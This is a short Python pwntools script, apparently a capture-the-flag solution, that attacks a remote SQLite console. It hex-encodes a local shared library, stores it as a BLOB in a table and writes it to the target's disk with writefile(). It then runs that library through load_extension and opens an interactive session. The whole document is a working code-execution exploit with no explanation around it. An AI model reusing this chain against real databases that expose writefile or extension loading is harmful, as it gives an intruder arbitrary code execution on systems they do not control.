from pwn import *
context.log_level='debug'
context.arch='amd64'
#context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./pwn')
import binascii
p = remote("notabug.nc.jctf.pro",1337)
ru         = lambda a:     p.readuntil(a)
r         = lambda n:        p.read(n)
sla     = lambda a,b:     p.sendlineafter(a,b)
sa         = lambda a,b:     p.sendafter(a,b)
sl        = lambda a:     p.sendline(a)
s         = lambda a:     p.send(a)
sla(b"> ",b"CREATE TABLE images(name TEXT, type TEXT, img BLOB);")
with open("./exp.so",'rb') as f:
    dt = f.read()
sla(b"> ",b"INSERT INTO images(name,type,img)")

dt = binascii.hexlify(dt)
# warning(chr(dt[1]))

print(dt.decode())
# input()

sla(b"> ",f"VALUES('icon','jpeg',cast(x'{dt.decode()}' as text));")
sla(b"> ",b"SELECT writefile('./exp.so',img) FROM images WHERE name='icon';")
# print(hex(int(p.readline())))
sla(b"> ",b"select Load_extension('./exp','exp');")
p.interactive()
